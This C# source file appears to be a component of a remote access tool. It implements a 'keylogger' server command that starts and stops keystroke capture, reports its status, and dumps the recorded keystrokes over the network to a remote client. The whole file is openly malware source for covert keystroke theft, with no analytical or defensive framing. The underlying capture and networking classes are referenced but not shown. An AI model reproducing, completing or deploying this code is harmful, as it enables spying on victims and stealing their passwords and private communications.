using KeyLogger;
using System;
using System.Collections.Generic;

namespace ServerCommands
{
    internal class KeyLogger : ICommand
    {
        public string name { get; } = "keylogger";

        KeyLoggerManager keyLoggerManager { get; set; }

        public void GetKeyLoggerManagerInstance(KeyLoggerManager manager) => keyLoggerManager = manager;
        

        public void Process(List<string> args)
        {
            switch (args[0])
            {
                case "start":
                    StartKeylogger();
                    break;
                case "stop":
                    StopKeylogger();
                    break;
                case "status":
                    SendKeyloggerStatusToClient();
                    break;
                case "dump":
                    SendKeyLogsToClient();
                    break;
            }
        }

        void StartKeylogger() => keyLoggerManager.StartListening();

        void StopKeylogger() => keyLoggerManager.StopListening();

        void SendKeyloggerStatusToClient() =>
            ServerCommandsManager.networkManager.WriteLine(keyLoggerManager.GetStatus() ? "The keylogger is running" : "The keylogger isn't started");

        void SendKeyLogsToClient() =>
            ServerCommandsManager.networkManager.WriteLine(keyLoggerManager.DumpLogs());
    }
}
